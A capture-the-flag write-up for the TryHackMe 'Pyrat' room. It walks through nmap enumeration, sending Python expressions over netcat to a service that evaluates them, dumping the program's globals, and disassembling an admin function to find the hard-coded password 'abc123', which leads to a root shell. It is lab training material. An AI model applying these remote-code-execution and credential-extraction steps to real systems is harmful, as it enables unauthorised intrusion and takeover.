# Pyrat — Write-up

**Platform:** TryHackMe  
**Room:** Pyrat  
**Difficulty:** Easy  
**Estimated Time:** ~60 minutes  

**Description:**  
Test your enumeration skills on this boot-to-root machine. Pyrat exposes an HTTP service with unusual behavior that leads to a potential Python code execution vulnerability. Through careful enumeration, credential discovery, and custom endpoint analysis, it is possible to escalate privileges and fully compromise the system.

---

## Initial Enumeration

### Nmap Scan

#### Basic TCP scan:

```bash
nmap -n -Pn -T4 10.65.139.64

Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-14 09:10 -0300
Nmap scan report for 10.65.139.64
Host is up (0.16s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8000/tcp open  http-alt
```

#### Version and default script scan:

```bash
nmap -n -Pn -T4 -sC -sV -p 22,8000 10.65.139.64

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http-alt SimpleHTTP/0.6 Python/3.11.2
```

### HTTP Interaction

```bash
curl http://10.65.139.64:8000

Try a more basic connection
```

### Raw Socket Interaction (Netcat)

```bash
nc 10.66.162.225 8000
1+1

print(1+1)
2

```

#### This confirms Python execution context and non-standard input handling.

---

## Summary of Findings

Based strictly on observed outputs from **Nmap scans** and the **manual curl/netcat interactions**:

1. **Exposed Services**: SSH (22/tcp) and port 8000.
2. **Python-Based HTTP Service**: Nmap indicates SimpleHTTP/0.6 on Python 3.11.2.
3. **Non-Standard HTTP Behavior**: Standard HTTP methods return Python errors.
4. **Input Execution**: Requests are evaluated as Python expressions, wrapped in `print()`.
5. **Manual Confirmation**: Netcat returns evaluated output for expressions.

This sets the stage for manual testing and function inspection.

---

## Execution Context Inspection

```python
nc 10.66.162.225 8000
print(globals())
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f1c143b14c0>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': '/root/pyrat.py', '__cached__': None, 'socket': <module 'socket' from '/usr/lib/python3.8/socket.py'>, 'sys': <module 'sys' (built-in)>, 'StringIO': <class '_io.StringIO'>, 'datetime': <module 'datetime' from '/usr/lib/python3.8/datetime.py'>, 'os': <module 'os' from '/usr/lib/python3.8/os.py'>, 'multiprocessing': <module 'multiprocessing' from '/usr/lib/python3.8/multiprocessing/__init__.py'>, 'manager': <multiprocessing.managers.SyncManager object at 0x7f1c14311640>, 'admins': <ListProxy object, typeid 'list' at 0x7f1c142859a0>, 'handle_client': <function handle_client at 0x7f1c13c5c8b0>, 'switch_case': <function switch_case at 0x7f1c13c5ce50>, 'exec_python': <function exec_python at 0x7f1c13c5cee0>, 'get_admin': <function get_admin at 0x7f1c13c5cf70>, 'shell': <function shell at 0x7f1c13c63040>, 'send_data': <function send_data at 0x7f1c13c630d0>, 'start_server': <function start_server at 0x7f1c13c63160>, 'remove_socket': <function remove_socket at 0x7f1c13c631f0>, 'is_http': <function is_http at 0x7f1c13c63280>, 'fake_http': <function fake_http at 0x7f1c13c63310>, 'change_uid': <function change_uid at 0x7f1c13c633a0>, 'host': '0.0.0.0', 'port': 8000, '__warningregistry__': {'version': 0}}

```

#### Confirms execution in main context with access to modules, functions, and sensitive objects.

---

## Function Analysis and Privilege Escalation

### Initial call:
```python
nc 10.66.162.225 8000
get_admin() missing 1 required positional argument: 'client_socket'
```

### Disassembled portion (simplified view):

```python
nc 10.66.162.225 8000
import dis; dis.dis(get_admin)
 77           0 LOAD_GLOBAL              0 (os)
              2 LOAD_METHOD              1 (getuid)
              4 CALL_METHOD              0
              6 STORE_FAST               1 (uid)

 78           8 LOAD_FAST                1 (uid)
             10 LOAD_CONST               1 (0)
             12 COMPARE_OP               3 (!=)
             14 POP_JUMP_IF_FALSE       30

 79          16 LOAD_GLOBAL              2 (send_data)
             18 LOAD_FAST                0 (client_socket)
             20 LOAD_CONST               2 ('Start a fresh client to begin.')      <<<<-----------Important notice
             22 CALL_FUNCTION            2
             24 POP_TOP

 80          26 LOAD_CONST               0 (None)
             28 RETURN_VALUE

 82     >>   30 LOAD_CONST               3 ('abc123')     <<<<-----------Important notice
             32 STORE_FAST               2 (password)

 84          34 LOAD_GLOBAL              3 (range)
             36 LOAD_CONST               1 (0)
             38 LOAD_CONST               4 (3)
             40 CALL_FUNCTION            2
             42 GET_ITER
        >>   44 FOR_ITER               136 (to 182)
             46 STORE_FAST               3 (i)

 86          48 LOAD_GLOBAL              2 (send_data)
             50 LOAD_FAST                0 (client_socket)
             52 LOAD_CONST               5 ('Password:')          <<<<-----------Important notice
             54 CALL_FUNCTION            2
             56 POP_TOP

 89          58 SETUP_FINALLY           70 (to 130)
             60 SETUP_FINALLY           20 (to 82)

 90          62 LOAD_FAST                0 (client_socket)
             64 LOAD_METHOD              7 (recv)
             66 LOAD_CONST               6 (1024)
             68 CALL_METHOD              1
             70 LOAD_METHOD              8 (decode)
             72 LOAD_CONST               7 ('utf-8')
             74 CALL_METHOD              1
             76 STORE_FAST               4 (data)
             78 POP_BLOCK
             80 JUMP_FORWARD            44 (to 126)

 91     >>   82 DUP_TOP
             84 LOAD_GLOBAL              9 (Exception)
             86 COMPARE_OP              10 (exception match)
             88 POP_JUMP_IF_FALSE      124
             90 POP_TOP
             92 STORE_FAST               5 (e)
             94 POP_TOP
             96 SETUP_FINALLY           14 (to 112)

 93          98 LOAD_GLOBAL              2 (send_data)
            100 LOAD_FAST                0 (client_socket)
            102 LOAD_FAST                5 (e)
            104 CALL_FUNCTION            2
            106 POP_TOP

 94         108 POP_BLOCK
            110 BEGIN_FINALLY
        >>  112 LOAD_CONST               0 (None)
            114 STORE_FAST               5 (e)
            116 DELETE_FAST              5 (e)
            118 END_FINALLY
            120 POP_EXCEPT
            122 JUMP_FORWARD             2 (to 126)
        >>  124 END_FINALLY
        >>  126 POP_BLOCK
            128 BEGIN_FINALLY

 97     >>  130 LOAD_GLOBAL              4 (sys)
            132 LOAD_ATTR                5 (__stdout__)
            134 LOAD_GLOBAL              4 (sys)
            136 STORE_ATTR               6 (stdout)
            138 END_FINALLY

 99         140 LOAD_FAST                4 (data)
            142 LOAD_METHOD             10 (strip)
            144 CALL_METHOD              0
            146 LOAD_FAST                2 (password)
            148 COMPARE_OP               2 (==)
            150 POP_JUMP_IF_FALSE       44

100         152 LOAD_GLOBAL             11 (admins)
            154 LOAD_METHOD             12 (append)
            156 LOAD_GLOBAL             13 (str)
            158 LOAD_FAST                0 (client_socket)
            160 CALL_FUNCTION            1
            162 CALL_METHOD              1
            164 POP_TOP

101         166 LOAD_GLOBAL              2 (send_data)
            168 LOAD_FAST                0 (client_socket)
            170 LOAD_CONST               8 ('Welcome Admin!!! Type "shell" to begin')        <<<<-----------Important notice
            172 CALL_FUNCTION            2
            174 POP_TOP

102         176 POP_TOP
            178 JUMP_ABSOLUTE          182
            180 JUMP_ABSOLUTE           44
        >>  182 LOAD_CONST               0 (None)
            184 RETURN_VALUE

```
### * A hardcoded password (`abc123`) is used for validation and "Start a fresh client to begin."

#### Reconnecting via Netcat and using correct admin/password:

```python
nc 10.66.162.225 8000
admin
Password:
abc123
Welcome Admin!!! Type "shell" to begig
shell
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /home
# ls
think  ubuntu
# cd think
# ls
snap  user.txt
# cd /root
# ls
pyrat.py  root.txt  snap
```

---

## Pwned by Hirt, Nelson.